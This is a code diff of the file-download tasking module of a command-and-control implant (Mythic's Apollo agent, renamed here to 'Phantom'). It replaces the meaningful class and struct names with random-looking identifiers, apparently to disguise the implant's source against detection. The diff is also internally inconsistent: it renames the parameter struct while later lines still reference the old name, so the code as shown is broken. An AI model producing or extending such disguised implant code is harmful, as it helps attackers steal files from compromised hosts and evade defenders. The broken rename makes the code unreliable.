@@ -8,18 +8,18 @@
 
 using System;
 using System.Linq;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
 
 namespace Tasks
 {
-    public class download : Tasking
+    public class CipherResolverE9E7 : Tasking
     {
         [DataContract]
-        internal struct DownloadParameters
+        internal struct ShadowTransformer1FFB
         {
             [DataMember(Name = "file")]
             public string FileName;
@@ -46,7 +46,7 @@ namespace Tasks
             {
                 DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
                 string host = parameters.Hostname;
-                if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
+                if (ValidationHelper.IsStringEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
                 {
                     resp = CreateTaskResponse(
                         $"File '{parameters.FileName}' does not exist.",
@@ -56,7 +56,7 @@ namespace Tasks
                 else
                 {
                     string path;
-                    if (string.IsNullOrEmpty(parameters.Hostname))
+                    if (ValidationHelper.IsStringEmpty(parameters.Hostname))
                     {
                         path = parameters.FileName;
                         string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
